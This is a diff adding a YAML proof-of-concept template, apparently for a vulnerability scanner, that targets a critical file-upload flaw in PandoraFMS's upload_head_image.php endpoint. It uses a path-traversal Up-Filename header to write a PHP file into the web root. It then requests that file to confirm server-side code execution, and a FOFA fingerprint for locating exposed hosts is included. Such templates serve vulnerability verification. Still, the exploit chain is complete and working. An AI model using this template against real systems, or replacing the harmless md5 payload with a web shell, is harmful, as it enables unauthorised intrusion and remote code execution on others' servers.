@@ -1,0 +1,30 @@
+id: poc-yaml-pandorafms-head-upload
+info:
+  name: PandoraFMS upload_head_image.php 接口处存在文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: pandorafms
+  fofa: app="PANDORAFMS-产品"
+variables:
+  t1: random_int(100,1000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /pandora_console/enterprise/meta/general/upload_head_image.php?up=true
+  headers:
+    Up-Filename: ../../../../../../../../../../var/www/html/pandora_console/extensions/test{{.t1}}.php
+  data: <?php echo md5($_REQUEST['c']); ?>
+  expression: 'status_code == 200 &&
+
+    body == "done"
+
+    '
+- method: GET
+  path: /pandora_console/extensions/test{{.t1}}.php?c={{.t1}}
+  expression: 'status_code == 200 &&
+
+    body == t2
+
+    '
+transport: http
